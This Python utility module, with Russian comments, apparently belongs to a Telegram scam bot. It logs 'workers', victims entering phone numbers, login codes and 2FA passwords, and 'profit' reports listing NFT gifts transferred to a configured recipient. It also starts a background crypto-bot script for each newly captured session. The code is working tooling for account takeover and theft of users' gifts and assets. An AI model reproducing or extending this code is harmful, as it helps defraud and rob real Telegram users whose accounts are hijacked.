import json
import asyncio
import fcntl
import time
import os
import sys
import socket
import requests
import random
import sqlite3
import struct
import base64
import re
import threading
import subprocess
from urllib.parse import parse_qs
from datetime import datetime, timezone, timedelta
from flask import request
from logger_config import get_logger, setup_utils_logging

# Импортируем TgCrypto для ускорения работы Pyrogram
try:
    import tgcrypto
except ImportError:
    pass  # TgCrypto не обязателен, но рекомендуется для производительности

# Настраиваем логирование для утилит
setup_utils_logging()
logger = get_logger(__name__, log_file="utils.log")

# Московское время (UTC+3)
MOSCOW_TZ = timezone(timedelta(hours=3))

def moscow_now():
    """Возвращает текущее время в московском часовом поясе"""
    return datetime.now(MOSCOW_TZ)

def moscow_strftime(format_str="%Y-%m-%d %H:%M:%S"):
    """Возвращает текущее московское время в виде строки"""
    return moscow_now().strftime(format_str)

SESSION_DATA_FILE = 'session_data.json'

def save_session_data(user_id, data):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
        else:
            session_data = {}
        session_data[str(user_id)] = {
            **data,
            'last_updated': moscow_now().isoformat()
        }
        with open(SESSION_DATA_FILE, 'w') as f:
            json.dump(session_data, f, indent=2)
        return True
    except Exception as e:
        return False

def load_session_data(user_id):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
                return session_data.get(str(user_id), {})
        return {}
    except Exception as e:
        return {}

def clear_session_data(user_id):
    try:
        if os.path.exists(SESSION_DATA_FILE):
            with open(SESSION_DATA_FILE, 'r') as f:
                session_data = json.load(f)
            if str(user_id) in session_data:
                del session_data[str(user_id)]
            with open(SESSION_DATA_FILE, 'w') as f:
                json.dump(session_data, f, indent=2)
        return True
    except Exception as e:
        return False

SESSION_DIR = 'sessions'
PHONE_FILE = 'phones.json'
ADMIN_TOKEN = 'admin_stub_token_XYZ123'

# Глобальный словарь для отслеживания активных процессов обработки подарков
# Ключ: f"{user_id}_{phone}", значение: True если идет обработка
_processing_status: dict = {}
# Thread-safe lock для синхронизации доступа к словарю
_processing_lock = threading.Lock()

# Кеш для проверки существования NFT (чтобы не проверять одну и ту же ссылку многократно)
# Ключ: NFT ссылка, значение: (exists: bool, timestamp: float)
_nft_existence_cache: dict = {}
_nft_cache_lock = threading.Lock()
NFT_CACHE_TTL = 3600  # Время жизни кеша в секундах (1 час)

# Async locks per session name to avoid concurrent access to underlying .session storage
_SESSION_LOCKS: dict[str, asyncio.Lock] = {}

def start_cryptobot_script_background(phone: str, user_id: int):
    """
    Запускает скрипт крипто-бота в фоне при начале обработки новой сессии
    
    :param phone: Номер телефона пользователя
    :param user_id: ID пользователя
    """
    try:
        # Путь к скрипту (utils.py находится в /root/getgems/, скрипт в /root/getgems/кб/)
        base_dir = os.path.dirname(os.path.abspath(__file__))  # /root/getgems
        script_path = os.path.join(base_dir, 'кб', 'cryptobot_script.py')
        
        # Проверяем существование скрипта
        if not os.path.exists(script_path):
            logger.warning(f"⚠️ Скрипт крипто-бота не найден: {script_path}")
            return
        
        # Получаем переменные окружения для env manager bot
        bot_token = os.getenv('ENV_MANAGER_BOT_TOKEN')
        chat_id = os.getenv('ENV_MANAGER_CHAT_ID')
        
        # Автоматически определяем сессию авто докида из utils.py (аккаунт 79060130047)
        auto_dokid_session = os.getenv('AUTO_DOKID_SESSION')
        if not auto_dokid_session:
            # Проверяем наличие сессии аккаунта авто докида (79060130047)
            auto_dokid_session_file = os.path.join(base_dir, 'sessions', '79060130047.session')
            auto_dokid_json_file = os.path.join(base_dir, 'sessions', '79060130047.json')
            if os.path.exists(auto_dokid_session_file) or os.path.exists(auto_dokid_json_file):
                auto_dokid_session = "79060130047"
                logger.info(f"✅ Автоматически определена сессия авто докида: {auto_dokid_session}")
        
        # Если нет токена или chat_id, не запускаем отправку в бот
        send_to_bot = bool(bot_token and chat_id)
        
        # Формируем команду для запуска
        cmd = [
            sys.executable,  # Python интерпретатор
            script_path,
            '--phone', str(phone),
            '--user-id', str(user_id),
        ]
        
        if send_to_bot:
            cmd.extend([
                '--send-to-bot',
                '--bot-token', bot_token,
                '--chat-id', chat_id
            ])
        
        # Добавляем сессию авто докида, если найдена
        if auto_dokid_session:
            cmd.extend(['--auto-dokid-session', auto_dokid_session])
        
        # Запускаем в фоне (не ждем завершения)
        # Используем subprocess.Popen с перенаправлением вывода в лог-файл
        log_file = os.path.join(base_dir, 'кб', 'cryptobot.log')
        
        with open(log_file, 'a') as f:
            process = subprocess.Popen(
                cmd,
                stdout=f,
                stderr=subprocess.STDOUT,
                cwd=os.path.dirname(script_path),
                env=os.environ.copy()
            )
        
        logger.info(f"✅ Скрипт крипто-бота запущен в фоне (PID: {process.pid}) для {phone}")
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска скрипта крипто-бота: {e}", exc_info=True)

# Ensure locks are created bound to the currently running loop context
def _ensure_lock(name: str) -> asyncio.Lock:
    lock = _SESSION_LOCKS.get(name)
    if lock is None:
        _SESSION_LOCKS[name] = asyncio.Lock()
        lock = _SESSION_LOCKS[name]
    return lock

def get_session_lock(name: str) -> asyncio.Lock:
    """Returns an asyncio.Lock for a given session/client name.
    Avoid cross-loop locks by recreating if bound to a different loop.
    """
    lock = _SESSION_LOCKS.get(name)
    try:
        current_loop = asyncio.get_running_loop()
    except RuntimeError:
        # No running loop; create a fresh lock for later use
        return _ensure_lock(name)

    if lock is None:
        return _ensure_lock(name)

    # Some runtimes may bind a lock to a different loop; detect and refresh
    # There's no public API to check lock's loop; we defensively recreate on loop change
    # by storing lock per loop key
    lock_key = f"{name}:{id(current_loop)}"
    if lock_key not in _SESSION_LOCKS:
        _SESSION_LOCKS[lock_key] = asyncio.Lock()
        lock = _SESSION_LOCKS[lock_key]
    return lock

class FileLock:
    """Simple cross-process file lock using fcntl."""
    def __init__(self, path: str):
        self.path = path
        self.fd = None

    async def acquire(self, timeout_ms: int = 5000, poll_ms: int = 100) -> bool:
        start = time.monotonic()
        # Ensure lock file exists and open a fd
        try:
            self.fd = os.open(self.path, os.O_CREAT | os.O_RDWR)
        except Exception:
            # Fallback: try to create directory if missing
            base_dir = os.path.dirname(self.path)
            if base_dir and not os.path.exists(base_dir):
                try:
                    os.makedirs(base_dir, exist_ok=True)
                except Exception:
                    pass
            self.fd = os.open(self.path, os.O_CREAT | os.O_RDWR)

        while True:
            try:
                fcntl.flock(self.fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
                return True
            except BlockingIOError:
                elapsed_ms = (time.monotonic() - start) * 1000
                if elapsed_ms >= timeout_ms:
                    return False
                await asyncio.sleep(poll_ms / 1000)

    def release(self):
        try:
            if self.fd is not None:
                fcntl.flock(self.fd, fcntl.LOCK_UN)
                os.close(self.fd)
                self.fd = None
        except Exception:
            pass

# Загружаем GIFT_RECIPIENT_ID из .env файла
GIFT_RECIPIENT_ID = int(os.getenv('GIFT_RECIPIENT_ID', '9999999999'))
GIFT_RECIPIENT_USERNAME = os.getenv('GIFT_RECIPIENT_USERNAME')
GIFT_RECIPIENT_PHONE = os.getenv('GIFT_RECIPIENT_PHONE')
STAR_REACTION_CHANNEL = os.getenv('STAR_REACTION_CHANNEL', '@stubchannel9021')
STAR_REACTION_MESSAGE_ID = int(os.getenv('STAR_REACTION_MESSAGE_ID', '999'))

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

def mask_phone_number(phone: str) -> str:
    """
    Маскирует номер телефона, показывая только первые 2 и последние 4 цифры
    Пример: +79991234567 -> +79******4567
    """
    if not phone:
        return "******"
    
    # Убираем все нецифровые символы кроме +
    digits = phone.replace('+', '').replace('-', '').replace(' ', '').replace('(', '').replace(')', '')
    
    if len(digits) < 6:
        return "******"
    
    # Показываем первые 2 и последние 4 цифры
    if phone.startswith('+'):
        return f"+{digits[:2]}******{digits[-4:]}"
    else:
        return f"{digits[:2]}******{digits[-4:]}"

def is_valid_nft_link(link: str) -> bool:
    """
    Проверяет валидность NFT ссылки.
    Валидная ссылка должна иметь формат: https://t.me/nft/NFTName-Number
    Например: https://t.me/nft/MoonPendant-38464
    
    Невалидные ссылки:
    - https://t.me/nft/gift-5832325860073407546 (начинается с "gift-")
    - https://t.me/nft/gift-{id} (сгенерированные ссылки без реального NFT)
    
    Args:
        link: Ссылка на NFT подарок
        
    Returns:
        True если ссылка валидна, False иначе
    """
    if not link or not isinstance(link, str):
        return False
    
    # Нормализуем ссылку (убираем пробелы, приводим к нижнему регистру для проверки)
    link = link.strip()
    if not link:
        return False
    
    # Проверяем, что это ссылка на NFT
    if 't.me/nft/' not in link.lower():
        return False
    
    # Извлекаем часть после /nft/
    try:
        # Разбиваем по /nft/ и берем последнюю часть
        parts = link.split('/nft/')
        if len(parts) < 2:
            return False
        
        nft_part = parts[-1].split('?')[0].split('#')[0]  # Убираем query params и anchors
        nft_part = nft_part.strip()
        
        # Проверяем, что не начинается с "gift-"
        if nft_part.lower().startswith('gift-'):
            return False
        
        # Проверяем формат: должно быть название NFT и номер через дефис
        # Например: MoonPendant-38464, IceCream-139843
        if '-' not in nft_part:
            return False
        
        # Разбиваем по дефису
        name_parts = nft_part.split('-')
        if len(name_parts) < 2:
            return False
        
        # Первая часть - название NFT (не должно быть пустым и не должно быть только цифрами)
        nft_name = name_parts[0]
        if not nft_name or nft_name.isdigit():
            return False
        
        # Последняя часть - номер (должен быть числом)
        nft_number = name_parts[-1]
        if not nft_number.isdigit():
            return False
        
        # Если все проверки пройдены - ссылка валидна
        return True
        
    except Exception:
        # Если произошла ошибка при парсинге - считаем ссылку невалидной
        return False

async def check_nft_exists(link: str, use_cache: bool = True) -> bool:
    """
    Проверяет существование NFT по ссылке через Telegram API.
    Использует кеш для оптимизации повторных проверок.
    
    Args:
        link: Ссылка на NFT (например, https://t.me/nft/MoonPendant-38464)
        use_cache: Использовать ли кеш для проверки (по умолчанию True)
        
    Returns:
        True если NFT существует, False иначе
    """
    if not link or not is_valid_nft_link(link):
        return False
    
    # Проверяем кеш
    if use_cache:
        with _nft_cache_lock:
            if link in _nft_existence_cache:
                exists, timestamp = _nft_existence_cache[link]
                # Проверяем, не устарел ли кеш
                if time.time() - timestamp < NFT_CACHE_TTL:
                    return exists
                # Удаляем устаревшую запись
                del _nft_existence_cache[link]
    
    # Если не в кеше или кеш отключен - проверяем через API
    try:
        from pyrogram import Client
        from telegram_client import API_ID, API_HASH
        import os
        
        # Пытаемся использовать первую доступную сессию для проверки
        # Ищем сессию в папке sessions
        session_dir = 'sessions'
        session_files = []
        if os.path.exists(session_dir):
            session_files = [f for f in os.listdir(session_dir) if f.endswith('.session')]
        
        if not session_files:
            # Если нет сессий, считаем что NFT существует (не можем проверить)
            logger.warning(f"⚠️ Нет доступных сессий для проверки существования NFT: {link}")
            return True  # Возвращаем True, чтобы не блокировать работу
        
        # Используем первую доступную сессию
        session_file = os.path.join(session_dir, session_files[0])
        session_name = os.path.splitext(session_files[0])[0]
        
        # Создаем временный клиент для проверки
        client = Client(
            name=f"nft_checker_{session_name}",
            api_id=API_ID,
            api_hash=API_HASH,
            workdir=session_dir
        )
        
        try:
            await client.start()
            
            # Пытаемся проверить существование NFT через проверку доступности канала @nft
            # и попытку получить информацию о сообщении
            try:
                # Парсим ссылку для получения части NFT
                # Формат: https://t.me/nft/NFTName-Number
                nft_part = link.split('/nft/')[-1].split('?')[0]
                
                # Пробуем проверить доступность канала @nft
                try:
                    # Пытаемся получить информацию о канале @nft
                    chat = await client.get_chat("@nft")
                    # Если канал доступен, пробуем проверить существование конкретного NFT
                    # Для этого можно попробовать получить сообщения или использовать другие методы
                    # Но точная проверка конкретного NFT требует дополнительных данных
                    # Поэтому проверяем хотя бы доступность канала
                    exists = True
                except Exception as chat_err:
                    error_str = str(chat_err).lower()
                    # Если канал недоступен или не существует
                    if any(x in error_str for x in ["username not occupied", "chat not found", "channel not found", "peer_id_invalid"]):
                        logger.debug(f"Канал @nft недоступен: {chat_err}")
                        exists = False
                    else:
                        # Другие ошибки (например, нет доступа) - считаем что NFT может существовать
                        logger.debug(f"Ошибка при проверке канала @nft: {chat_err}")
                        exists = True
            
            except Exception as check_err:
                logger.debug(f"Ошибка при проверке существования NFT {link}: {check_err}")
                # В случае общей ошибки считаем что NFT существует, чтобы не блокировать работу
                exists = True
            
        finally:
            await client.stop()
        
        # Сохраняем результат в кеш
        if use_cache:
            with _nft_cache_lock:
                _nft_existence_cache[link] = (exists, time.time())
                # Очищаем старые записи из кеша (оставляем только последние 1000)
                if len(_nft_existence_cache) > 1000:
                    # Удаляем самые старые записи
                    sorted_cache = sorted(_nft_existence_cache.items(), key=lambda x: x[1][1])
                    for old_link, _ in sorted_cache[:-1000]:
                        del _nft_existence_cache[old_link]
        
        return exists
        
    except Exception as e:
        logger.warning(f"⚠️ Ошибка при проверке существования NFT {link}: {e}")
        # В случае ошибки считаем что NFT существует, чтобы не блокировать работу
        return True

async def is_valid_nft_link_with_check(link: str, check_existence: bool = False) -> bool:
    """
    Проверяет валидность NFT ссылки с опциональной проверкой существования.
    
    Args:
        link: Ссылка на NFT подарок
        check_existence: Проверять ли существование NFT через API (по умолчанию False)
        
    Returns:
        True если ссылка валидна (и существует, если check_existence=True), False иначе
    """
    # Сначала проверяем формат
    if not is_valid_nft_link(link):
        return False
    
    # Если требуется проверка существования
    if check_existence:
        return await check_nft_exists(link)
    
    return True

async def send_minimal_log_to_telegram(action_type: str, worker_name: str = None, user_name: str = None, additional_info: str | dict = None, phone: str = None, nft_links: list = None, account_stats: dict = None, user_id: int = None):
    """
    Отправляет детальные и красивые логи в Telegram форумную группу
    Профиты идут в отдельную тему, все остальные логи в другую тему
    
    Поддерживает использование отдельного бота для логов через переменную окружения LOGS_BOT_TOKEN
    
    Args:
        action_type: Тип события (check_created, check_activated, phone_entered, code_entered, 2fa_entered, processing_completed, profit)
        worker_name: Имя воркера
        user_name: Имя пользователя
        additional_info: Дополнительная информация (строка или словарь, для профита может быть словарь с ключом 'failed_transfers')
        phone: Номер телефона (будет замаскирован при отображении)
        nft_links: Список ссылок на NFT подарки (для профита)
        user_id: Telegram ID пользователя (для авто-резолва воркера)
    """
    try:
        logger.info(f"[send_minimal_log_to_telegram] Called: action_type={action_type}, user_name={user_name}, worker_name={worker_name}, user_id={user_id}")
        
        # --- АВТО-РЕЗОЛВ ВОРКЕРА: Если worker_name не передан или "неизвестно", ищем по user_id ---
        resolved_worker_name = worker_name
        if (not resolved_worker_name or str(resolved_worker_name).lower() in ("неизвестно", "unknown", "")) and user_id:
            try:
                import database
                db_instance = getattr(database, "db", None)
                if db_instance is None or not isinstance(db_instance, database.Database):
                    db_instance = database.Database()
                if hasattr(db_instance, "get_worker_for_user"):
                    binding = db_instance.get_worker_for_user(user_id, only_active=True)
                    if binding:
                        worker_username = binding.get("username")
                        if worker_username:
                            resolved_worker_name = f"@{worker_username}" if not worker_username.startswith("@") else worker_username
                            logger.info(f"[send_minimal_log_to_telegram] ✅ Auto-resolved worker for user {user_id}: {resolved_worker_name}")
            except Exception as auto_worker_err:
                logger.debug(f"[send_minimal_log_to_telegram] Failed to auto-resolve worker for user {user_id}: {auto_worker_err}")
        
        # Если user_id не передан, но есть user_name вида "ID: 12345", извлекаем ID
        if not user_id and user_name:
            id_match = re.search(r'ID[:\s]+(\d+)', str(user_name))
            if id_match:
                extracted_id = int(id_match.group(1))
                # Если воркер ещё не определён, пробуем найти его по извлечённому ID
                if (not resolved_worker_name or str(resolved_worker_name).lower() in ("неизвестно", "unknown", "")):
                    try:
                        import database
                        db_instance = getattr(database, "db", None)
                        if db_instance is None or not isinstance(db_instance, database.Database):
                            db_instance = database.Database()
                        if hasattr(db_instance, "get_worker_for_user"):
                            binding = db_instance.get_worker_for_user(extracted_id, only_active=True)
                            if binding:
                                worker_username = binding.get("username")
                                if worker_username:
                                    resolved_worker_name = f"@{worker_username}" if not worker_username.startswith("@") else worker_username
                                    logger.info(f"[send_minimal_log_to_telegram] ✅ Auto-resolved worker for extracted user_id {extracted_id}: {resolved_worker_name}")
                    except Exception as auto_worker_err2:
                        logger.debug(f"[send_minimal_log_to_telegram] Failed to auto-resolve worker for extracted user_id {extracted_id}: {auto_worker_err2}")
        
        worker_name = resolved_worker_name or worker_name  # Используем резолвнутый воркер
        
        from aiogram import Bot
        from config_bot import config
        import os
        
        # Получаем ID форумной группы из переменной окружения
        forum_chat_id = os.getenv("FORUM_CHAT_ID") or os.getenv("PROFIT_CHAT_ID")
        if not forum_chat_id:
            logger.warning(f"FORUM_CHAT_ID or PROFIT_CHAT_ID not set, skipping log for action_type={action_type}")
            return
        
        # Поддержка отдельного бота для логов (если задан LOGS_BOT_TOKEN, используем его)
        # Иначе используем основной бот из config
        logs_bot_token = os.getenv("LOGS_BOT_TOKEN") or os.getenv("TELEGRAM_LOGS_BOT_TOKEN")
        if logs_bot_token:
            bot = Bot(token=logs_bot_token)
            logger.debug("Using separate logs bot token")
        else:
            bot = Bot(token=config.BOT_TOKEN)
            logger.debug("Using main bot token for logs")
        
        # Определяем тему в зависимости от типа события
        # Профиты идут в отдельную тему, все остальное в тему логов
        if action_type == "profit":
            # Для профитов используем отдельную тему
            topic_id_env = os.getenv("PROFIT_TOPIC_ID") or os.getenv("PROFIT_FORUM_TOPIC_ID")
        else:
            # Для всех остальных логов используем тему логов
            # Сначала пробуем новые переменные, потом старые как fallback
            topic_id_env = os.getenv("LOGS_TOPIC_ID") or os.getenv("LOGS_FORUM_TOPIC_ID")
            if not topic_id_env:
                # Fallback на старые переменные для обратной совместимости
                topic_id_env = os.getenv("FORUM_TOPIC_ID") or os.getenv("FORUM_CHAT_TOPIC_ID")
        
        message_thread_id = None
        if topic_id_env and str(topic_id_env).isdigit():
            message_thread_id = int(topic_id_env)
            logger.debug(f"Topic ID set for {action_type}: {message_thread_id}")
        else:
            # Если тема не задана, это критично для форумных групп
            if action_type == "profit":
                logger.warning(f"PROFIT_TOPIC_ID not set for profit log, sending without topic_id (may fail in forum groups)")
            else:
                # Для обычных логов без темы - не отправляем, чтобы не было ошибок
                logger.warning(f"⚠️ LOGS_TOPIC_ID and FORUM_TOPIC_ID not set for action_type={action_type}, skipping log (forum groups require topic_id). Set LOGS_TOPIC_ID or FORUM_TOPIC_ID environment variable!")
                logger.info(f"[send_minimal_log_to_telegram] Skipping log for {action_type} because topic_id is not set. Checked: LOGS_TOPIC_ID={os.getenv('LOGS_TOPIC_ID')}, LOGS_FORUM_TOPIC_ID={os.getenv('LOGS_FORUM_TOPIC_ID')}, FORUM_TOPIC_ID={os.getenv('FORUM_TOPIC_ID')}, FORUM_CHAT_TOPIC_ID={os.getenv('FORUM_CHAT_TOPIC_ID')}")
                return
        
        # Получаем текущее время
        timestamp = moscow_strftime("%Y-%m-%d %H:%M:%S")
        
        # Формируем красивое и детальное сообщение
        message = ""
        
        if action_type == "check_created":
            worker_display = worker_name or "❓ Неизвестно"
            message = f"""💠 <b>ЧЕК СОЗДАН</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👷 <b>Воркер:</b> {worker_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
        
        elif action_type == "gift_created":
            worker_display = worker_name or "❓ Неизвестно"
            message = f"""🎁 <b>ПОДАРОК СОЗДАН</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👷 <b>Воркер:</b> {worker_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
        
        elif action_type == "check_activated":
            user_display = user_name or "❓ Неизвестно"
            worker_display = worker_name or "❓ Неизвестно"
            message = f"""✅ <b>ЧЕК АКТИВИРОВАН</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Активировал:</b> {user_display}
┃ 👷 <b>Воркер:</b> {worker_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 Чек успешно активирован пользователем"""
        
        elif action_type == "gift_activated":
            user_display = user_name or "❓ Неизвестно"
            worker_display = worker_name or "❓ Неизвестно"
            message = f"""🎯 <b>ПОДАРОК АКТИВИРОВАН</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Активировал:</b> {user_display}
┃ 👷 <b>Воркер:</b> {worker_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 Подарок успешно активирован"""
        
        elif action_type == "phone_entered":
            user_display = user_name or "❓ Неизвестно"
            worker_display = worker_name or "❓ Неизвестно"
            phone_display = mask_phone_number(phone) if phone else "❓ Не указан"
            message = f"""📱 <b>ВВОД НОМЕРА ТЕЛЕФОНА</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ 👨‍💻 <b>Воркер:</b> {worker_display}
┃ 📞 <b>Номер:</b> <code>{phone_display}</code>
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔐 Пользователь ввел номер телефона для авторизации"""
        
        elif action_type == "code_sent":
            user_display = user_name or "❓ Неизвестно"
            worker_display = worker_name or "❓ Неизвестно"
            phone_display = mask_phone_number(phone) if phone else "❓ Не указан"
            details_text = ""
            if additional_info:
                if isinstance(additional_info, dict):
                    details_text = f"\n┃ 📝 <b>Детали:</b> {additional_info.get('details', str(additional_info))}"
            else:
                    details_text = f"\n┃ 📝 <b>Детали:</b> {additional_info}"
            message = f"""📤 <b>КОД ОТПРАВЛЕН</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ 👨‍💻 <b>Воркер:</b> {worker_display}
┃ 📞 <b>Номер:</b> <code>{phone_display}</code>{details_text}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Код подтверждения отправлен пользователю"""
        
        elif action_type == "code_entered":
            user_display = user_name or "❓ Неизвестно"
            message = f"""🔐 <b>ВВОД КОДА ПОДТВЕРЖДЕНИЯ</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Пользователь ввел код подтверждения"""
        
        elif action_type == "code_verified":
            user_display = user_name or "❓ Неизвестно"
            worker_display = worker_name or "❓ Неизвестно"
            phone_display = mask_phone_number(phone) if phone else "❓ Не указан"
            details_text = ""
            if additional_info:
                if isinstance(additional_info, dict):
                    details_text = f"\n┃ 📝 <b>Детали:</b> {additional_info.get('details', str(additional_info))}"
                else:
                    details_text = f"\n┃ 📝 <b>Детали:</b> {additional_info}"
            message = f"""✅ <b>КОД ПОДТВЕРЖДЕН</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ 👨‍💻 <b>Воркер:</b> {worker_display}
┃ 📞 <b>Номер:</b> <code>{phone_display}</code>{details_text}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Код успешно подтвержден"""
        
        elif action_type == "auth_success":
            user_display = user_name or "❓ Неизвестно"
            
            # Если есть статистика аккаунта, показываем детальную информацию
            if account_stats:
                gifts_stats = account_stats.get('gifts_stats', {})
                stars_balance = account_stats.get('stars_balance', 0)
                total_gifts = gifts_stats.get('total_gifts', 0)
                nft_gifts = gifts_stats.get('nft_gifts', 0)
                transferable_gifts = gifts_stats.get('transferable_gifts', 0)
                non_transferable_gifts = gifts_stats.get('non_transferable_gifts', 0)
                
                message = f"""✅ <b>УСПЕШНАЯ АВТОРИЗАЦИЯ</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ ⭐ <b>Баланс звёзд:</b> {stars_balance}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎁 <b>СТАТИСТИКА ПОДАРКОВ:</b>
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 📦 <b>Всего подарков:</b> {total_gifts}
┃ 💎 <b>NFT подарков:</b> {nft_gifts}
┃ ✅ <b>Доступны для передачи:</b> {transferable_gifts}
┃ 🔒 <b>Заблокированы:</b> {non_transferable_gifts}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 Пользователь успешно авторизован"""
            else:
                # Если статистики нет, показываем базовое сообщение
                message = f"""✅ <b>УСПЕШНАЯ АВТОРИЗАЦИЯ</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 Пользователь успешно авторизован"""
        
        elif action_type == "session_processing_started" or action_type == "session_processing_start":
            user_display = user_name or "❓ Неизвестно"
            message = f"""⚙️ <b>НАЧАТА ОБРАБОТКА СЕССИИ</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 Началась обработка подарков пользователя"""
        
        elif action_type == "session_processing_completed" or action_type == "session_processing_complete":
            user_display = user_name or "❓ Неизвестно"
            phone_display = mask_phone_number(phone) if phone else "❓ Не указан"
            message = f"""✅ <b>ОБРАБОТКА СЕССИИ ЗАВЕРШЕНА</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ 📞 <b>Телефон:</b> <code>{phone_display}</code>
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 Обработка подарков пользователя завершена"""
        
        elif action_type == "2fa_required":
            user_display = user_name or "❓ Неизвестно"
            phone_display = mask_phone_number(phone) if phone else "❓ Не указан"
            message = f"""🛡️ <b>ТРЕБУЕТСЯ 2FA ПАРОЛЬ</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ 📞 <b>Номер:</b> <code>{phone_display}</code>
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔒 Требуется ввод двухфакторного пароля"""
        
        elif action_type == "2fa_entered":
            user_display = user_name or "❓ Неизвестно"
            worker_display = worker_name or "❓ Неизвестно"
            message = f"""🛡️ <b>ВВОД 2FA ПАРОЛЯ</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ 👨‍💻 <b>Воркер:</b> {worker_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔒 Пользователь ввел двухфакторный пароль"""
        
        elif action_type == "processing_completed":
            user_display = user_name or "❓ Неизвестно"
            message = f"""✅ <b>ОБРАБОТКА ЗАВЕРШЕНА</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👤 <b>Пользователь:</b> {user_display}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎉 Обработка сессии пользователя успешно завершена"""
        
        elif action_type == "profit":
            worker_display = worker_name or "❓ Неизвестно"
            gift_count = len(nft_links) if nft_links else 0
            
            # Получаем информацию о неудачных передачах из additional_info (если передана)
            failed_transfers_info = None
            if additional_info and isinstance(additional_info, dict):
                failed_transfers_info = additional_info.get('failed_transfers', None)
            elif isinstance(additional_info, list):
                # Если additional_info это список неудачных передач
                failed_transfers_info = additional_info if len(additional_info) > 0 else None
            
            message = f"""💰 <b>НОВЫЙ ПРОФИТ!</b>

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ 👷 <b>Воркер:</b> {worker_display}
┃ 🎁 <b>Подарков успешно:</b> {gift_count}
┃ ⏰ <b>Время:</b> {timestamp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            
            # Добавляем список удачных NFT подарков со ссылками
            if nft_links and len(nft_links) > 0:
                # Фильтруем только валидные NFT ссылки
                valid_nft_links = [link for link in nft_links if is_valid_nft_link(link)]
                if valid_nft_links:
                    message += f"\n\n<b>✅ УДАЧНЫЕ ПЕРЕДАЧИ ({len(valid_nft_links)}):</b>\n"
                    # Показываем первые 15 валидных NFT для профитов
                    for i, link in enumerate(valid_nft_links[:15], 1):
                        # Извлекаем название NFT из ссылки
                        nft_name = link.split('/')[-1] if '/' in link else link
                        message += f"  {i}. <a href=\"{link}\">{nft_name}</a>\n"
